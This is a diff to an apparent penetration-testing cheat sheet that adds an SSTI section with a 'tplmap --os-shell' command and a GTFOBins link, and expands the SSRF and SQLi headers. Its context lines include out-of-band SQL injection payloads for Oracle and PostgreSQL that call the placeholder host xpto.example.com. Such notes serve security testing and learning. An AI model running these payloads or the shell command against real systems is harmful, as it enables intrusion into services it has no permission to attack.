@@ -347,7 +347,7 @@
 ### Reusing Cookies
 	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
 
-### SSRF
+### SSRF (Server-Side Request Forgery)
 	https://lab.wallarm.com/blind-ssrf-exploitation/
 
 ### DNS Rebinding
@@ -400,7 +400,7 @@
 	
 	https://github.com/calebstewart/pwncat
 
-### SQLi
+### SQLi (SQL Injection)
 	DNS Detection
 		Oracle
 			'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'
@@ -419,8 +419,17 @@
 		PostgreSQL
 			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'
 
+### SSTI (Server Side Template Injection)
+	# Template Injections (SSTI) in 10 minutes
+		https://www.youtube.com/watch?v=SN6EVIG4c-0
+		
+	https://portswigger.net/research/server-side-template-injection
+	
+	https://github.com/epinna/tplmap
+		tplmap.py --os-shell -u 'http://www.example.com/page?name=John'
+
 ### Fake Server
-	A simple HTTP Request & Response Service.
+	# A simple HTTP Request & Response Service.
 		https://httpbin.org/
 		
 	# HTTP
@@ -443,6 +452,9 @@
 ### General useful commands
 	# Trim space and newlines on bash variable
 		"${i//[$'\t\r\n ']}"
+		
+	# GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
+		https://gtfobins.github.io/
 
 ### Generic Tools
 	The Cyber Swiss Army Knife
